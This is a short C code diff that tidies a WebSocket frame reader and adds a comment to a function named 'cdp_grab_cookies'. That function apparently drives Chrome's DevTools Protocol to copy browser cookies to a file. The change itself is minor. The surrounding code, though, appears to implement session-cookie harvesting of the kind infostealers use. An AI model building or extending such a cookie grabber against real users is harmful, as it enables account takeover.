@@ -211,20 +211,17 @@ static int ws_recv_text(HANDLE sock, char *out, size_t out_max) {
     if (ws2_recv(sock, hdr, 2, &n) != WS2_OK || n < 2) return -1;
 
     size_t payload_len = hdr[1] & 0x7F;
-    size_t hdr_extra = 0;
 
     if (payload_len == 126) {
         uint8_t ext[2];
         if (ws2_recv(sock, ext, 2, &n) != WS2_OK || n < 2) return -1;
         payload_len = ((size_t)ext[0] << 8) | ext[1];
-        hdr_extra = 2;
     } else if (payload_len == 127) {
         uint8_t ext[8];
         if (ws2_recv(sock, ext, 8, &n) != WS2_OK || n < 8) return -1;
         payload_len = 0;
         for (int i = 0; i < 8; i++)
             payload_len = (payload_len << 8) | ext[i];
-        hdr_extra = 8;
     }
 
     if (payload_len >= out_max) return -1;
@@ -484,6 +481,7 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
     int ws_port = port;
     char ws_path[256] = "/";
 
+    /* localhost-only — no TLS needed for loopback CDP */
     /* Parse ws://host:port/path */
     const char *url_start = strstr(ws_url, "ws://");
     if (url_start) {
